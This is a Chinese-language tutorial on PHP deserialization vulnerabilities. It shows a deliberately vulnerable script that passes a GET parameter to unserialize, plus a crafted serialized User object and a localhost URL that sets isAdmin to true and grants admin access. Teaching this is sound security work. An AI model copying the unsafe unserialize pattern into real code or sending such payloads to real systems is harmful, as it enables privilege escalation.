# PHP反序列化漏洞详解

PHP反序列化漏洞是指在PHP应用程序中，反序列化不受信任的数据时，攻击者通过构造恶意数据，导致系统执行非预期的操作。这个漏洞利用PHP的`unserialize`函数，由于`unserialize`函数在处理对象时，会调用对象的魔术方法（如`__wakeup`、`__destruct`），攻击者可以利用这些方法执行恶意代码。

### 反序列化漏洞产生的原因

1. **直接反序列化用户输入**：应用程序直接对用户输入的数据进行反序列化。
2. **缺乏数据验证和过滤**：反序列化前没有对数据进行充分的验证和过滤。
3. **使用危险的魔术方法**：类中包含可能被利用的魔术方法（如`__wakeup`、`__destruct`）。

### 示例：PHP反序列化漏洞演示

#### 演示环境准备

创建一个包含反序列化漏洞的PHP文件`vulnerable.php`：

```php
<?php
class User {
    public $name;
    public $isAdmin;

    public function __construct($name, $isAdmin) {
        $this->name = $name;
        $this->isAdmin = $isAdmin;
    }

    public function __wakeup() {
        if ($this->isAdmin) {
            echo "Admin access granted for user: {$this->name}\n";
        }
    }
}

// 模拟不安全的反序列化
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    $object = unserialize($data);
    var_dump($object);
}
?>
```

#### 触发漏洞

构造一个恶意序列化字符串，并通过GET请求传递给`vulnerable.php`。

```php
<?php
// 构造恶意数据
class User {
    public $name;
    public $isAdmin;

    public function __construct($name, $isAdmin) {
        $this->name = $name;
        $this->isAdmin = $isAdmin;
    }
}

$maliciousUser = new User("Attacker", true);
$maliciousData = serialize($maliciousUser);
echo $maliciousData;
?>
```

将上述代码保存为`malicious.php`并运行，得到类似于以下的输出：

```
O:4:"User":2:{s:4:"name";s:8:"Attacker";s:7:"isAdmin";b:1;}
```

通过浏览器访问`vulnerable.php`，构造URL如下：

```
http://localhost/vulnerable.php?data=O:4:"User":2:{s:4:"name";s:8:"Attacker";s:7:"isAdmin";b:1;}
```

访问后，页面将输出：

```
Admin access granted for user: Attacker
object(User)#1 (2) {
  ["name"]=>
  string(8) "Attacker"
  ["isAdmin"]=>
  bool(true)
}
```